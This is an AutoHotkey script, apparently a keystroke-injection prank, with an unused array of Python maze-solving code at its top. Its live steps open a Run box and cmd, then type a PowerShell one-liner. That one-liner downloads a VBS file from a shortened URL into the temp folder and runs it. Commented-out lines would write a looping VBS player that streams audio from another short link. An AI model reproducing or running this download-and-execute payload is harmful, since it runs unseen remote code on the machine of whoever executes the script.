#NoEnv
#Persistent
; SendMode Input
pld:=["def get_maze():", "    m=open('input.txt', 'r')", "    maze=[]", "    for l in m.readlines():maze.append(list(map(int,l.split()))) if l.split()!=[] else maze", "    m.close()", "    return maze", "", "maze=get_maze()", "end=5,5", "ans=[]", "", "def do_maze(m,e,x,y,p):", "    if(x==e[0] and y==e[1]):", "        ans.append(p)", "        return", "    if(x+1<=5 and m[x+1][y]==1):", "        m[x+1][y]=2", "        do_maze(m, e, x+1, y, p+'R')", "        m[x+1][y]=1", "    if(y+1<=5 and m[x][y+1]==1):", "        m[x][y+1]=2", "        do_maze(m, e, x, y+1, p+'D')", "        m[x][y+1]=1", "", "do_maze(maze,end,1,1,'')", "print(1 if len(ans)>0 else 0)"]

Sleep 3500
Send #{space}
Sleep 200
Send #{space}
Sleep 200
Send #r
Sleep 200
Send {Shift}
Send {Delete}
Send {Delete}
Send {Delete}
Send {Delete}
Sleep 200
Send cmd
Send {enter}
Sleep 200
Send {Shift}
Sleep 500
Send powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','`%tmp`%\\rickroll.vbs'); && start `%tmp`%\\rickroll.vbs
; Send del `%tmp`%\rickyou.vbs
; Send {enter}
; Sleep 200
; Send del `%tmp`%\volup.vbs
; Send {enter}
; Sleep 200
; Send cd `%tmp`% && copy con rickyou.vbs
; Send {enter}
; Send While true
; Send {enter}
; Send Dim oPlayer
; Send {enter}
; Send Set oPlayer = CreateObject("WMPlayer.OCX")
; Send {enter}
; Send oPlayer.URL = "http://tinyurl.com/s63ve48"
; Send {enter}
; Send oPlayer.controls.play
; Send {enter}
; Send While oPlayer.playState <> 1 ' 1 = Stopped
; Send {enter}
; Send WScript.Sleep 100
; Send {enter}
; Send Wend
; Send {enter}
; Send oPlayer.close
; Send {enter}
; Send Wend
; Send {enter}
; Sleep 100
; Send ^z
Send {enter}
